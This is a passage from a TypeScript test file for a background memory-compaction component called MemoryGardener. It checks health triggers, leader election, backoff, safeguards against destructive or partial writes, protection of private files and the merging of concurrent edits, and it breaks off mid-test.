// Deterministic, offline tests for autonomous background memory compaction (`src/share/memory-gardener.ts`)
// and its event-driven wiring from `MemorySync` (`onSettled` + `edit`).
import assert from "node:assert/strict";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, test } from "node:test";
import { Effect, Exit, Scope } from "effect";
import { TestClock } from "effect/testing";
import { LINE_MOST, MEMORY_MOST, SKILL_MOST } from "../src/agents/instructions.ts";
import { Cloud } from "../src/cloud/state.ts";
import { MemorySync, memoryPath, type MemorySettledEvent } from "../src/share/memory.ts";
import {
  COOLDOWN_MS,
  DEBOUNCE_MS,
  MAX_MEMORY_INPUT_BYTES,
  MemoryGardener,
  NO_PROGRESS_GROWTH_BYTES,
  NO_PROGRESS_WINDOW_MS,
  TIMEOUT_MS,
  gardenerRank,
  inspectMemoryHealth,
  isAllowedDeletePath,
  isAllowedWritePath,
  isGardenerLeader,
  originalPathForConflict,
  parseCompactionOutput,
  pickGardenerCandidate,
  preserveConcurrentLines,
  stationTag,
  uniqueContentBytes,
  validateCompactionOutput,
  type CompactionInput,
  type CompactionOutput,
} from "../src/share/memory-gardener.ts";

const A = "a".repeat(64);
const B = "b".repeat(64);
const C = "c".repeat(64);

const dirs: string[] = [];
const scopes: Scope.Closeable[] = [];
const gardeners: MemoryGardener[] = [];
const syncs: MemorySync[] = [];

after(async () => {
  for (const g of gardeners) await g.stop();
  for (const s of syncs) await s.stop();
  for (const sc of scopes) await Effect.runPromise(Scope.close(sc, Exit.void));
  for (const d of dirs) rmSync(d, { recursive: true, force: true });
});

function tempDir(prefix = "gardener-"): string {
  const dir = mkdtempSync(join(tmpdir(), prefix));
  dirs.push(dir);
  mkdirSync(join(dir, "skills"), { recursive: true });
  return dir;
}

function makeClock() {
  const scope = Effect.runSync(Scope.make());
  scopes.push(scope);
  const clock = Effect.runSync(Scope.provide(TestClock.make(), scope));
  const advance = async (ms: number) => {
    await Effect.runPromise(clock.adjust(ms));
  };
  return { clock, advance };
}

function makeCloud(opts: {
  station: string;
  name?: string;
  peers?: any[];
  rigs?: any[];
  rigSelf?: any;
  workspace?: string;
}): Cloud {
  const ws = opts.workspace ?? "ws-1";
  const name = opts.name ?? "alpha";
  const peers = opts.peers ?? [{ id: opts.station, name }];
  const rigs = opts.rigs ?? [];
  return Object.defineProperties(Object.create(Cloud.prototype), Object.getOwnPropertyDescriptors({
    peersCurrent: true,
    lock: null,
    get state() {
      return {
        station: opts.station,
        name,
        workspace: ws,
        workspace_name: ws,
        peers,
        rigs,
        revocations: [],
        joined: [],
        ...(opts.rigSelf !== undefined ? { rig: opts.rigSelf } : {}),
      } as any;
    },
    listen() {
      return () => {};
    },
  })) as Cloud;
}

const writeRel = (dir: string, rel: string, content: string, mode = 0o644) => {
  const full = join(dir, ...rel.split("/"));
  mkdirSync(join(full, ".."), { recursive: true });
  writeFileSync(full, content, { encoding: "utf8", mode });
  chmodSync(full, mode);
};

const readRel = (dir: string, rel: string) => {
  const full = join(dir, ...rel.split("/"));
  return existsSync(full) ? readFileSync(full, "utf8") : null;
};

const settledEvent = (dir: string, conflictMerged = false, ws = "ws-1"): MemorySettledEvent => ({
  workspace: ws,
  dir,
  conflictMerged,
});

// ── 1. Health inspection triggers ──

test("inspectMemoryHealth: healthy <= 8 KB memory does not trigger", async () => {
  const dir = tempDir();
  writeRel(dir, "MEMORY.md", "# Global Memory\n\n- Keep commits small.\n- Use TestClock in tests.\n");
  writeRel(dir, "skills/proj/SKILL.md", "---\nname: proj\ndescription: Project notes\n---\n\n- Build with pnpm.\n");
  const report = await inspectMemoryHealth(dir, { conflictMerged: false });
  assert.equal(report.needed, false);
  assert.equal(report.reasons.length, 0);
  assert.deepEqual(report.skillIndex, [{ name: "proj", description: "Project notes" }]);
});

test("inspectMemoryHealth: triggers on MEMORY.md > 8 KB, long line > 1500 B, oversized SKILL.md, real conflict files, conflictMerged, legacy markers", async () => {
  // MEMORY.md > 8 KB
  const dir1 = tempDir();
  writeRel(dir1, "MEMORY.md", `${"- rule line\n".repeat(900)}`);
  const r1 = await inspectMemoryHealth(dir1);
  assert.equal(r1.needed, true);
  assert.equal(r1.memoryOverLimit, true);
  assert.ok(r1.memoryBytes > MEMORY_MOST);

  // Single line > 1500 B in MEMORY.md
  const dir2 = tempDir();
  writeRel(dir2, "MEMORY.md", `- ${"x".repeat(LINE_MOST + 10)}\n`);
  const r2 = await inspectMemoryHealth(dir2);
  assert.equal(r2.needed, true);
  assert.ok(r2.reasons.some((s) => s.includes(`${LINE_MOST}`)));

  // SKILL.md > 24 KB (and ignores builtin skills)
  const dir3 = tempDir();
  writeRel(dir3, "MEMORY.md", "# Memory\n- ok\n");
  writeRel(dir3, "skills/big-proj/SKILL.md", `---\nname: big-proj\ndescription: big\n---\n${"a".repeat(SKILL_MOST + 128)}\n`);
  writeRel(dir3, "skills/stillfail-jobs/SKILL.md", "b".repeat(SKILL_MOST + 1024));
  const r3 = await inspectMemoryHealth(dir3);
  assert.equal(r3.needed, true);
  assert.equal(r3.oversizedSkills.length, 1);
  assert.equal(r3.oversizedSkills[0]!.path, "skills/big-proj/SKILL.md");

  // Real conflict file with existing sibling original vs ordinary `.conflict-resolution.md` without original
  const dir4 = tempDir();
  writeRel(dir4, "MEMORY.md", "# Memory\n- ok\n");
  writeRel(dir4, "skills/proj/SKILL.md", "---\nname: proj\ndescription: d\n---\nmain\n");
  writeRel(dir4, "skills/proj/SKILL.conflict-Studio.md", "other station version\n");
  writeRel(dir4, "skills/proj/notes.conflict-resolution.md", "regular doc whose sibling notes.md does not exist\n");
  const r4 = await inspectMemoryHealth(dir4);
  assert.equal(r4.needed, true);
  assert.equal(r4.conflictFiles.length, 1);
  assert.equal(r4.conflictFiles[0]!.path, "skills/proj/SKILL.conflict-Studio.md");

  // conflictMerged event flag
  const dir5 = tempDir();
  writeRel(dir5, "MEMORY.md", "# Memory\n- ok\n");
  const r5 = await inspectMemoryHealth(dir5, { conflictMerged: true });
  assert.equal(r5.needed, true);
  assert.equal(r5.hasConflicts, true);

  // Legacy retired station marker
  const dir6 = tempDir();
  writeRel(dir6, "MEMORY.md", "# Memory\n<!-- the memory of station old-box, retired into this one -->\n- rule\n");
  const r6 = await inspectMemoryHealth(dir6);
  assert.equal(r6.needed, true);
  assert.ok(r6.reasons.some((s) => s.includes("retired station merge marker")));

  // [station] tagged merge line
  const dir7 = tempDir();
  writeRel(dir7, "MEMORY.md", "# Memory\n- [Studio] old merged rule\n");
  const r7 = await inspectMemoryHealth(dir7);
  assert.equal(r7.needed, true);
  assert.ok(r7.reasons.some((s) => s.includes("[station]")));
});

// ── 2. Deterministic single-station leader election + rank>0 fallback takeover ──

test("gardenerRank / isGardenerLeader: elects rank-0 full station, excludes rigs and offline peers", async () => {
  const peers = [
    { id: B, name: "beta" },
    { id: A, name: "alpha" },
    { id: C, name: "gamma" },
  ];
  assert.equal(gardenerRank(makeCloud({ station: A, peers }), "ws-1"), 0);
  assert.equal(gardenerRank(makeCloud({ station: B, peers }), "ws-1"), 1);
  assert.equal(gardenerRank(makeCloud({ station: C, peers }), "ws-1"), 2);
  assert.equal(isGardenerLeader(makeCloud({ station: A, peers }), "ws-1"), true);
  assert.equal(isGardenerLeader(makeCloud({ station: B, peers }), "ws-1"), false);

  // If A is a rig, B becomes rank-0 full station
  const rigs = [{ id: A, name: "alpha-rig", owner: "u1", owner_email: "a@b.c", owner_name: "u" }];
  assert.equal(isGardenerLeader(makeCloud({ station: B, peers, rigs }), "ws-1"), true);
  assert.equal(gardenerRank(makeCloud({ station: C, peers, rigs }), "ws-1"), 1);

  // If this station itself is a rig, rank is -1
  assert.equal(
    gardenerRank(makeCloud({ station: A, peers, rigSelf: { owner: "u1", owner_email: "a@b.c", owner_name: "u", person: "p" } }), "ws-1"),
    -1,
  );

  // If A is explicitly offline, B becomes leader
  const peersWithOffline = [
    { id: A, name: "alpha", online: false },
    { id: B, name: "beta", online: true },
    { id: C, name: "gamma" },
  ];
  assert.equal(isGardenerLeader(makeCloud({ station: B, peers: peersWithOffline }), "ws-1"), true);
});

test("MemoryGardener: rank > 0 station takes over if workspace stays unhealthy past takeover delay", async () => {
  const dir = tempDir();
  writeRel(dir, "MEMORY.md", "- repeated bloat line\n".repeat(500));
  const { clock, advance } = makeClock();
  const peers = [
    { id: A, name: "alpha" },
    { id: B, name: "beta" },
  ];
  let calls = 0;
  const takeoverStepMs = 60_000;

  const g = new MemoryGardener({
    cloud: makeCloud({ station: B, name: "beta", peers }),
    clock,
    takeoverStepMs,
    compact: async () => {
      calls++;
      return { memoryMd: "# Compact\n- repeated bloat line\n" };
    },
  });
  gardeners.push(g);

  // Initial unhealthy event on rank-1 station -> does not run immediately
  g.onSettled(settledEvent(dir));
  await advance(DEBOUNCE_MS);
  await g.idle();
  assert.equal(calls, 0);

  // Halfway through takeover delay -> still waiting for rank-0
  await advance(takeoverStepMs / 2);
  await g.idle();
  assert.equal(calls, 0);

  // Past rank * takeoverStepMs -> rank-1 takes over and compacts
  await advance(takeoverStepMs / 2 + 100);
  await g.idle();
  assert.equal(calls, 1);
  assert.equal(readRel(dir, "MEMORY.md"), "# Compact\n- repeated bloat line\n");
});

test("MemoryGardener silently skips when canCompact returns false (no usable profile)", async () => {
  const dir = tempDir();
  writeRel(dir, "MEMORY.md", "- rule\n".repeat(1500));
  const { clock, advance } = makeClock();
  let calls = 0;
  let available = false;

  const g = new MemoryGardener({
    cloud: makeCloud({ station: A }),
    clock,
    canCompact: () => available,
    compact: async () => {
      calls++;
      return { memoryMd: "# Compact\n- rule\n" };
    },
  });
  gardeners.push(g);

  g.onSettled(settledEvent(dir));
  await advance(DEBOUNCE_MS);
  await g.idle();
  assert.equal(calls, 0);

  available = true;
  g.onSettled(settledEvent(dir));
  await advance(DEBOUNCE_MS);
  await g.idle();
  assert.equal(calls, 1);
  assert.equal(readRel(dir, "MEMORY.md"), "# Compact\n- rule\n");
});

// ── 3. Cooldown deferral, size/conflict hysteresis, and exponential backoff ──

test("MemoryGardener: cooldown defers events instead of dropping them and stops once healthy", async () => {
  const dir = tempDir();
  writeRel(dir, "MEMORY.md", "- rule line\n".repeat(900));
  const { clock, advance } = makeClock();
  let calls = 0;

  const g = new MemoryGardener({
    cloud: makeCloud({ station: A }),
    clock,
    compact: async () => {
      calls++;
      return { memoryMd: `# Memory\n${"- compact\n".repeat(500)}` };
    },
  });
  gardeners.push(g);

  // Burst debounced into one run
  g.onSettled(settledEvent(dir));
  await advance(DEBOUNCE_MS / 2);
  g.onSettled(settledEvent(dir));
  await advance(DEBOUNCE_MS / 2);
  await g.idle();
  assert.equal(calls, 0);

  await advance(DEBOUNCE_MS / 2);
  await g.idle();
  assert.equal(calls, 1);
  assert.ok(Buffer.byteLength(readRel(dir, "MEMORY.md")!, "utf8") < MEMORY_MOST);

  // Overgrow again during cooldown -> deferred, does NOT run immediately, runs automatically when cooldown expires
  writeRel(dir, "MEMORY.md", "- overgrown again\n".repeat(700));
  g.onSettled(settledEvent(dir));
  await advance(DEBOUNCE_MS);
  await g.idle();
  assert.equal(calls, 1, "blocked during cooldown");

  // Advance to end of cooldown (without emitting any new event!) -> deferred event fires
  await advance(COOLDOWN_MS);
  await g.idle();
  assert.equal(calls, 2, "deferred event ran automatically when cooldown expired");
});

test("MemoryGardener: size/conflict hysteresis holds across routine edits until >=2KB growth or new conflict", async () => {
  const dir = tempDir();
  const hardRules = Array.from({ length: 220 }, (_, i) => `- hard rule #${i}: keep this invariant`).join("\n") + "\n";
  writeRel(dir, "MEMORY.md", hardRules);
  const { clock, advance } = makeClock();
  let calls = 0;

  const g = new MemoryGardener({
    cloud: makeCloud({ station: A }),
    clock,
    compact: async (input) => {
      calls++;
      return { memoryMd: input.memoryMd };
    },
  });
  gardeners.push(g);

  g.onSettled(settledEvent(dir));
  await advance(DEBOUNCE_MS);
  await g.idle();
  assert.equal(calls, 1);

  // Routine edit changes sha(MEMORY.md) by +100 bytes (< 2 KB) -> still suppressed after cooldown
  await advance(COOLDOWN_MS + 1000);
  writeRel(dir, "MEMORY.md", `${hardRules}- small tweak that changes sha only\n`);
  g.onSettled(settledEvent(dir));
  await advance(DEBOUNCE_MS);
  await g.idle();
  assert.equal(calls, 1, "routine edit below +2KB must not defeat hysteresis");

  // New real conflict file breaks hysteresis
  writeRel(dir, "skills/proj/SKILL.md", "---\nname: proj\ndescription: p\n---\nmain\n");
  writeRel(dir, "skills/proj/SKILL.conflict-Studio.md", "conflicting line\n");
  g.onSettled(settledEvent(dir));
  await advance(DEBOUNCE_MS);
  await g.idle();
  assert.equal(calls, 2);

  // Remove conflict and grow by >= 2 KB -> breaks hysteresis
  rmSync(join(dir, "skills/proj/SKILL.conflict-Studio.md"), { force: true });
  await advance(COOLDOWN_MS + 1000);
  const growth = Array.from({ length: 120 }, (_, i) => `- newly added rule #${i}: extra`).join("\n") + "\n";
  assert.ok(Buffer.byteLength(growth, "utf8") >= NO_PROGRESS_GROWTH_BYTES);
  writeRel(dir, "MEMORY.md", `${hardRules}${growth}`);
  g.onSettled(settledEvent(dir));
  await advance(DEBOUNCE_MS);
  await g.idle();
  assert.equal(calls, 3);

  // After 24h hysteresis window expires -> allowed again
  await advance(NO_PROGRESS_WINDOW_MS + 1000);
  g.onSettled(settledEvent(dir));
  await advance(DEBOUNCE_MS);
  await g.idle();
  assert.equal(calls, 4);
});

test("MemoryGardener: exponential backoff on failure and hard timeout", async () => {
  const dir = tempDir();
  writeRel(dir, "MEMORY.md", "- rule\n".repeat(1500));
  const { clock, advance } = makeClock();
  let calls = 0;
  let mode: "fail" | "hang" | "ok" = "fail";
  const hangStarted = Promise.withResolvers<void>();

  const g = new MemoryGardener({
    cloud: makeCloud({ station: A }),
    clock,
    compact: async (_input, signal) => {
      calls++;
      if (mode === "fail") throw new Error("provider 503");
      if (mode === "hang") {
        hangStarted.resolve();
        await new Promise((_res, rej) => {
          signal.addEventListener("abort", () => rej(new Error("aborted")), { once: true });
        });
      }
      return { memoryMd: "# Clean\n- rule\n" };
    },
  });
  gardeners.push(g);

  // 1st failure -> 30m backoff
  g.onSettled(settledEvent(dir));
  await advance(DEBOUNCE_MS);
  await g.idle();
  assert.equal(calls, 1);

  // At 29m -> still in backoff (deferred until 30m)
  mode = "hang";
  await advance(COOLDOWN_MS - DEBOUNCE_MS - 1000);
  g.onSettled(settledEvent(dir));
  await advance(DEBOUNCE_MS);
  await g.idle();
  assert.equal(calls, 1);

  // At 30m -> deferred event launches 2nd attempt -> hangs -> hard timeout at 90s -> 60m backoff
  await advance(2000);
  await hangStarted.promise;
  await advance(TIMEOUT_MS + 100);
  await g.idle();
  assert.equal(calls, 2);

  // At +45m -> still in 60m backoff
  mode = "ok";
  await advance(45 * 60_000);
  g.onSettled(settledEvent(dir));
  await advance(DEBOUNCE_MS);
  await g.idle();
  assert.equal(calls, 2);

  // At +60m -> deferred event succeeds
  await advance(16 * 60_000);
  await g.idle();
  assert.equal(calls, 3);
  assert.equal(readRel(dir, "MEMORY.md"), "# Clean\n- rule\n");
});

// ── 4. P0-1 Destructive shortening guard ──

test("P0-1: rejects destructive shortening of 60 KB unique rules to 2 lines, but allows deduplicating 60 KB repeated lines or migrating to skills", async () => {
  // Case A: 60 KB of unique rules truncated to 2 lines -> REJECTED, file untouched
  const dirUnique = tempDir();
  const unique60k = Array.from({ length: 1000 }, (_, i) => `- Unique durable rule #${i}: always verify invariant ${i} before release`).join("\n") + "\n";
  assert.ok(uniqueContentBytes(unique60k) > 50_000);
  writeRel(dirUnique, "MEMORY.md", unique60k);
  const { clock, advance } = makeClock();

  const g1 = new MemoryGardener({
    cloud: makeCloud({ station: A }),
    clock,
    compact: async () => ({ memoryMd: "# Memory\n- Only two lines left\n" }),
  });
  gardeners.push(g1);

  g1.onSettled(settledEvent(dirUnique));
  await advance(DEBOUNCE_MS);
  await g1.idle();
  assert.equal(readRel(dirUnique, "MEMORY.md"), unique60k, "destructive shortening must leave MEMORY.md untouched");

  // Case B: 60 KB of duplicated lines deduplicated to 2 lines -> ALLOWED
  const dirDup = tempDir();
  const dup60k = "- Repeated stale line that appeared on every merge\n".repeat(1200);
  assert.ok(Buffer.byteLength(dup60k, "utf8") > 55_000);
  assert.ok(uniqueContentBytes(dup60k) < 100);
  writeRel(dirDup, "MEMORY.md", dup60k);

  const g2 = new MemoryGardener({
    cloud: makeCloud({ station: A }),
    clock,
    compact: async () => ({ memoryMd: "# Memory\n- Repeated stale line that appeared on every merge\n" }),
  });
  gardeners.push(g2);

  g2.onSettled(settledEvent(dirDup));
  await advance(DEBOUNCE_MS);
  await g2.idle();
  assert.equal(readRel(dirDup, "MEMORY.md"), "# Memory\n- Repeated stale line that appeared on every merge\n");

  // Case C: Unique rules migrated into skills/machines + concise MEMORY.md -> ALLOWED
  const dirMig = tempDir();
  const unique12k = Array.from({ length: 200 }, (_, i) => `- Machine pvg-office-2 fact #${i}: path /opt/service-${i}`).join("\n") + "\n";
  writeRel(dirMig, "MEMORY.md", unique12k);
  const reportMig = await inspectMemoryHealth(dirMig);
  const resMig = validateCompactionOutput(
    {
      memoryMd: "# Memory\n- See skills/machines/pvg-office-2.md\n",
      writes: [{ path: "skills/machines/pvg-office-2.md", content: unique12k.slice(0, 6000) }],
    },
    reportMig,
  );
  assert.equal(resMig.ok, true);
});

// ── 5. P0-2 Deletes whitelist, conflict format, and pre-unlink sha verification ──

test("P0-2: rejects unsent conflict deletes, rejects non-conflict filenames, and skips deleting conflict modified mid-run", async () => {
  // Format check
  assert.equal(originalPathForConflict("skills/proj/SKILL.conflict-Studio.md"), "skills/proj/SKILL.md");
  assert.equal(originalPathForConflict("skills/proj/notes.conflict-resolution.md"), "skills/proj/notes.md");
  assert.equal(isAllowedDeletePath("MEMORY.md"), false);
  assert.equal(isAllowedDeletePath("skills/proj/SKILL.md"), false);
  assert.equal(isAllowedDeletePath("PROJECTS.jsonl"), false);

  // Unsent conflict path rejected by validator
  const dir = tempDir();
  writeRel(dir, "MEMORY.md", "- rule\n".repeat(1500));
  writeRel(dir, "skills/proj/SKILL.md", "---\nname: proj\ndescription: p\n---\nmain\n");
  writeRel(dir, "skills/proj/SKILL.conflict-Studio.md", "conflict body\n");
  const report = await inspectMemoryHealth(dir);
  const unsentRes = validateCompactionOutput(
    {
      memoryMd: "# Compact\n- rule\n",
      deletes: ["skills/proj/SKILL.conflict-Studio.md"],
    },
    report,
    { sentConflictPaths: new Set(), sentFullTexts: new Map([["MEMORY.md", report.memoryMd]]) },
  );
  assert.equal(unsentRes.ok, false);

  // Conflict modified during compaction -> NOT deleted on disk
  const { clock, advance } = makeClock();
  const started = Promise.withResolvers<void>();
  const release = Promise.withResolvers<void>();

  const g = new MemoryGardener({
    cloud: makeCloud({ station: A }),
    clock,
    compact: async () => {
      started.resolve();
      await release.promise;
      return {
        memoryMd: "# Compact\n- rule\n",
        deletes: ["skills/proj/SKILL.conflict-Studio.md"],
      };
    },
  });
  gardeners.push(g);

  g.onSettled(settledEvent(dir));
  await advance(DEBOUNCE_MS);
  await started.promise;

  // Modify conflict file while compaction is in flight
  writeRel(dir, "skills/proj/SKILL.conflict-Studio.md", "updated conflict body with new info\n");
  release.resolve();
  await g.idle();

  assert.equal(readRel(dir, "skills/proj/SKILL.conflict-Studio.md"), "updated conflict body with new info\n", "modified conflict file must not be deleted");
});

// ── 6. P0-3 Owner-only 0600 private file protection ──

test("P0-3: never reads 0600 private files into LLM input and refuses to overwrite them; preserves existing shared mode", async () => {
  const dir = tempDir();
  writeRel(dir, "MEMORY.md", "- rule\n".repeat(1500));
  writeRel(dir, "skills/secret/SKILL.md", `---\nname: secret\ndescription: priv\n---\n${"s".repeat(SKILL_MOST + 500)}\n`, 0o600);
  writeRel(dir, "skills/machines/private.md", "SECRET_TOKEN=xyz\n", 0o600);
  writeRel(dir, "skills/machines/pvg.md", "- public host\n", 0o664);

  const report = await inspectMemoryHealth(dir);
  assert.equal(report.oversizedSkills.length, 0, "0600 SKILL.md must not be read or flagged");
  assert.equal(report.machinesFiles.some((f) => f.path.includes("private.md")), false, "0600 machine file must not be read");
  assert.equal(report.machinesFiles.some((f) => f.path === "skills/machines/pvg.md"), true);

  // Attempt to overwrite 0600 private file -> entire plan rejected, zero writes!
  const { clock, advance } = makeClock();
  const originalMem = readRel(dir, "MEMORY.md")!;
  const g1 = new MemoryGardener({
    cloud: makeCloud({ station: A }),
    clock,
    compact: async () => ({
      memoryMd: "# Compact\n- rule\n",
      writes: [{ path: "skills/machines/private.md", content: "overwritten\n" }],
    }),
  });
  gardeners.push(g1);

  g1.onSettled(settledEvent(dir));
  await advance(DEBOUNCE_MS);
  await g1.idle();
  assert.equal(readRel(dir, "skills/machines/private.md"), "SECRET_TOKEN=xyz\n");
  assert.equal(readRel(dir, "MEMORY.md"), originalMem, "whole plan aborted when any target is 0600 private");

  // Updating existing 0664 shared file preserves 0664; new file gets 0644
  const g2 = new MemoryGardener({
    cloud: makeCloud({ station: A }),
    clock,
    compact: async () => ({
      memoryMd: "# Compact\n- rule\n",
      writes: [
        { path: "skills/machines/pvg.md", content: "- updated public host\n" },
        { path: "skills/machines/new-box.md", content: "- brand new host\n" },
      ],
    }),
  });
  gardeners.push(g2);

  g2.onSettled(settledEvent(dir));
  await advance(DEBOUNCE_MS);
  await g2.idle();
  assert.equal(statSync(join(dir, "skills/machines/pvg.md")).mode & 0o777, 0o664);
  assert.equal(statSync(join(dir, "skills/machines/new-box.md")).mode & 0o777, 0o644);
});

// ── 7. P0-4 Full pre-validation (zero partial commits) + P1-10 appends & unread-file write refusal ──

test("P0-4 & P1-10: refuses overwriting unread existing skill (zero partial writes) and supports appends preserving YAML frontmatter", async () => {
  const dir = tempDir();
  const originalMem = "- rule\n".repeat(1500);
  const originalProj = "---\nname: proj\ndescription: Project rules\n---\n\n- Existing project rule 1.\n";
  writeRel(dir, "MEMORY.md", originalMem);
  writeRel(dir, "skills/proj/SKILL.md", originalProj);
  const { clock, advance } = makeClock();

  // Model tries to write skills/machines/a.md (valid) AND overwrite unread skills/proj/SKILL.md (disallowed) -> ZERO files written!
  const g1 = new MemoryGardener({
    cloud: makeCloud({ station: A, name: "pvg-office-2" }),
    clock,
    compact: async (input) => {
      assert.equal(input.stations[0]!.tag, "pvg-office-2");
      return {
        memoryMd: "# Compact\n- rule\n",
        writes: [
          { path: "skills/machines/pvg-office-2.md", content: "- machine fact\n" },
          { path: "skills/proj/SKILL.md", content: "- wiped frontmatter!\n" },
        ],
      };
    },
  });
  gardeners.push(g1);

  g1.onSettled(settledEvent(dir));
  await advance(DEBOUNCE_MS);
  await g1.idle();
  assert.equal(readRel(dir, "skills/machines/pvg-office-2.md"), null, "no partial commit when another target fails");
  assert.equal(readRel(dir, "skills/proj/SKILL.md"), originalProj);
  assert.equal(readRel(dir, "MEMORY.md"), originalMem);

  // Using `appends` on unread existing skill succeeds and keeps YAML frontmatter intact
  const g2 = new MemoryGardener({
    cloud: makeCloud({ station: A, name: "pvg-office-2" }),
    clock,
    compact: async () => ({
      memoryMd: "# Compact\n- rule\n",
      writes: [{ path: "skills/machines/pvg-office-2.md", content: "- machine fact\n" }],
      appends: [{ path: "skills/proj/SKILL.md", content: "- Migrated project rule 2." }],
    }),
  });
  gardeners.push(g2);

  g2.onSettled(settledEvent(dir));
  await advance(DEBOUNCE_MS);
  await g2.idle();

  const afterProj = readRel(dir, "skills/proj/SKILL.md")!;
  assert.ok(afterProj.startsWith("---\nname: proj\ndescription: Project rules\n---\n"), "YAML frontmatter preserved");
  assert.ok(afterProj.includes("- Existing project rule 1."));
  assert.ok(afterProj.includes("- Migrated project rule 2."));
  assert.equal(readRel(dir, "skills/machines/pvg-office-2.md"), "- machine fact\n");
  // Ensure no leftover temp files
  assert.equal(readdirSync(join(dir, "skills/machines")).some((f) => f.includes("gardener-tmp")), false);
  assert.equal(memoryPath("skills/machines/.pvg-office-2.md.1.gardener-tmp"), false, "hidden tmp file ignored by memoryPath");
});

// ── 8. P1-11 Concurrent-edit preservation (additions kept, deletions respected, `---` preserved) ──

test("P1-11: preserveConcurrentLines retains concurrent additions, respects concurrent deletions, and never drops `---`", async () => {
  // Direct unit checks
  const base = "---\nname: s\n---\n- rule A\n- rule B\n- rule C\n";
  const live = "---\nname: s\n---\n- rule A\n- rule C\n- rule D (added)\n"; // rule B deleted, rule D added
  const compacted = "---\nname: s\n---\n- rule A\n- rule B\n"; // model still kept rule B
  const merged = preserveConcurrentLines(base, live, compacted);
  assert.equal(merged, "---\nname: s\n---\n- rule A\n- rule D (added)\n");

  // Full gardener concurrent write test (duplicate bloat so P0-1 deduplication passes cleanly)
  const dir = tempDir();
  const bloat = "- obsolete repeated status note: build running\n".repeat(400);
  const initial = `# Global Memory\n- Durable rule A.\n- Rule to be deleted concurrently.\n${bloat}`;
  writeRel(dir, "MEMORY.md", initial);
  const { clock, advance } = makeClock();

  const started = Promise.withResolvers<void>();
  const release = Promise.withResolvers<void>();

  const g = new MemoryGardener({
    cloud: makeCloud({ station: A }),
    clock,
    compact: async (): Promise<CompactionOutput> => {
      started.resolve();
      await release.promise;
      return {
        memoryMd: "# Global Memory\n- Durable rule A.\n- Rule to be deleted concurrently.\n",
      };
    },
  });
  gardeners.push(g);

  g.onSettled(settledEvent(dir));
  await advance(DEBOUNCE_MS);
  await started.promise;

  // Live agent deletes one rule and appends a brand new rule while compaction is in flight
  const concurrentRule = "- Brand new critical rule added during compaction.";
  const liveDuring = initial.replace("- Rule to be deleted concurrently.\n", "") + `${concurrentRule}\n`;
  writeRel(dir, "MEMORY.md", liveDuring);

  release.resolve();
  await g.idle();

  const afterText = readRel(dir, "MEMORY.md")!;
  assert.ok(afterText.includes("- Durable rule A."));
  assert.ok(afterText.includes(concurrentRule), "preserved concurrent addition");
  assert.ok(!afterText.includes("- Rule to be deleted concurrently."), "did not resurrect concurrently deleted rule");
  assert.ok(!afterText.includes("obsolete repeated status note"), "did not re-introduce deleted bloat");
});

// ── 9. P1-9 billedPerUse exclusion + P1-10 stationTag + P1-13 input cap + P2-15 strict JSON ──

test("P1-9, P1-10, P1-13, P2-15: excludes billedPerUse by default, normalizes stationTag, skips >120KB MEMORY.md, rejects prose JSON", async () => {
  // P1-10 stationTag
  assert.equal(stationTag("pvg-office-2"), "pvg-office-2");
  assert.equal(stationTag("CON"), "CON-station");
  assert.equal(stationTag("  ---My Station!---  "), "My-Station");
  assert.equal([...stationTag("a".repeat(60))].length, 40);

  // P2-15 strict JSON parsing
  assert.deepEqual(parseCompactionOutput("```json\n{\"memoryMd\":\"# Ok\\n- a\\n\"}\n```"), { memoryMd: "# Ok\n- a\n" });
  assert.equal(parseCompactionOutput("Here is the JSON you asked for: {\"memoryMd\":\"# Ok\"}"), null);

  // P1-9 pickGardenerCandidate excludes billedPerUse by default
  const billedProfile = {
    id: "api-key-1",
    name: "API Key",
    enabled: true,
    access: { kind: "anthropic-api" },
    runtimes: ["claude"],
    models: ["claude-sonnet-4-5"],
    named: ["claude-sonnet-4-5"],
    model: "claude-sonnet-4-5",
    backgroundOnMessage: true,
    spelling: (m: string) => m,
  };
  const fakeHub = {
    config: () => ({ profiles: [billedProfile] }),
    accounts: {
      profile: (id: string) => (id === billedProfile.id ? billedProfile : null),
      healthOf: () => ({ check: { state: "ok", models: ["claude-sonnet-4-5"] } }),
    },
    drivers: new Map([["claude", {}]]),
  } as any;
  const cloud = makeCloud({ station: A });
  assert.equal(pickGardenerCandidate(fakeHub, cloud, "ws-1"), null, "billedPerUse excluded by default");
  assert.ok(pickGardenerCandidate(fakeHub, cloud, "ws-1", { allowBilled: true }) !== null, "allowed when explicitly opted in");

  // P1-13 MEMORY.md > 120 KB skipped without calling compact
  const dirBig = tempDir();
  writeRel(dirBig, "MEMORY.md", "x".repeat(MAX_MEMORY_INPUT_BYTES + 1024));
  const { clock, advance } = makeClock();
  let calls = 0;
  const g = new MemoryGardener({
    cloud,
    clock,
    compact: async () => {
      calls++;
      return { memoryMd: "# Compact\n" };
    },
  });
  gardeners.push(g);
  g.onSettled(settledEvent(dirBig));
  await advance(DEBOUNCE_MS);
  await g.idle();
  assert.equal(calls, 0);
});

// ── 10. Clean stop() of in-flight compaction ──

test("MemoryGardener.stop(): aborts in-flight compaction cleanly without writing to disk", async () => {
  const dir = tempDir();
  const original = "- bloat\n".repeat(1500);
  writeRel(dir, "MEMORY.md", original);
  const { clock, advance } = makeClock();

  const started = Promise.withResolvers<void>();
  let aborted = false;

  const g = new MemoryGardener({
    cloud: makeCloud({ station: A }),
    clock,
    compact: async (_input, signal) => {
      started.resolve();
      await new Promise<void>((resolve) => {
        signal.addEventListener("abort", () => {
          aborted = true;
          resolve();
        }, { once: true });
      });
      return { memoryMd: "# Should not be written\n" };
    },
  });
  gardeners.push(g);

  g.onSettled(settledEvent(dir));
  await advance(DEBOUNCE_MS);
  await started.promise;

  await g.stop();
  assert.equal(aborted, true);
  assert.equal(readRel(dir, "MEMORY.md"), original);
});

// ── 11. P0-5 & P1-7 End-to-end wiring: MemorySync.edit lane serialization + clean vs conflict merge ──

test("P0-5 & P1-7: MemorySync.edit serializes writes on workspace lane; clean 3-way merge keeps conflictMerged=false while apart/tags trigger compaction", async () => {
  const dataA = tempDir("sync-a-");
  const dataB = tempDir("sync-b-");
  const homeA = join(dataA, "agent");
  const homeB = join(dataB, "agent");
  mkdirSync(join(homeA, "skills"), { recursive: true });
  mkdirSync(join(homeB, "skills"), { recursive: true });

  const peers = [
    { id: A, name: "ccvm" },
    { id: B, name: "Studio" },
  ];
  const cloudA = makeCloud({ station: A, name: "ccvm", peers });
